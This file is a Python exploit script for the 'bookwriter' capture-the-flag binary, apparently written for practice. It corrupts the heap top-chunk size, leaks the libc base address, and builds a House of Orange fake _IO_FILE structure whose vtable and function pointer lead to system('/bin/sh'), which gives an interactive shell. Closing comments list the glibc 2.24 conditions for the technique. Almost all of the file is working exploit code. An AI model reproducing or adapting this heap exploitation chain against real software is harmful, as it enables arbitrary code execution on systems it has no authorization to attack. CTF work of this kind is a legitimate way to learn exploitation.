from PwnContext import *

if __name__ == '__main__':        
    # context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    #context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    ctx.binary = './bookwriter'
    #elf=ELF('./bookwriter')
    #ctx.remote_libc = '/home/leo/Downloads/bf_libc.so'
    #ctx.remote = ('pwnable.kr', 9001)
    #ctx.debug_remote_libc = True # True for debugging remote libc, false for local.
    ctx.symbols={'name':0x602060,'lst':0x6020a0}
    ctx.breakpoints=[0x400D4D]
    rs()
    #rs('remote') # uncomment this for exploiting remote target

    libc = ctx.libc # ELF object of the corresponding libc.

    # ipy() # if you have ipython, you can use this to check variables.
    
    def add(sz,c):
        sla('Your choice :',1)
        sla('Size of page :',sz)
        sa('Content :',c)
    def show(idx):
        sla('Your choice :',2)
        sla('Index of page :',idx)
        ru('Content :\n')
    def edit(idx,c):
        sla('Your choice :',3)
        sla('Index of page :',idx)
        sa('Content:',c)
    def change(c):
        sla('Your choice :',4)
        sla('(yes:1 / no:0) ',1)
        sa('Author :',c)
    
    sa('Author :','/bin/sh\x00'+'\n')
    add(0,'')
    add(0x18,'1'*0x10+'\n') 
    edit(1,'1'*0x18)
    edit(1,'1'*0x18+'\xc1\x0f\n')#top chunk
    add(0x1000,'2'*0xf0+'\n')
    #leak libc
    add(0x18,'3')
    show(3)
    lb =uu64(r(6))-0x3c4c33-0x500
    success('libc_base= {}'.format(hex(lb)))
    
    for i in range(5):
        add(0x10,str(i)*0x10)
    
    #house of orange 
    io_list_all = libc.sym['_IO_list_all']+lb
    io_str_jump = 0x3c37a0+lb#libc.sym['_IO_str_jumps']+lb
    print hex(io_str_jump)
    sys = libc.sym['system']+lb
    binsh= 0x602060  
    pay = p64(0)*30
    pay+= p64(0)+p64(0x61)#flags+size
    pay+= p64(lb+0x3c4b78) + p64(io_list_all-0x10)#fd bk
    pay+= p64(2)+p64(3)#base ptr
    pay+= p64(0)
    pay+= p64(binsh)
    pay+= p64(0)*(0xd8/8-8)
    pay+= p64(io_str_jump-8)#vtable
    pay+= p64(0)
    pay+= p64(sys)
    
    edit(0,pay)
    #dbg()
    irt()
'''
basic:
    fp->mode<=0
    write_ptr > write_base

+
2.24 and lower:
    fp->_flags=0
    fp->IO_buf_base=addr(/bin/sh)
    fp+0xe8=system
    vtable=_IO_str_jumps-8#0x3c37a0-8

'''
    
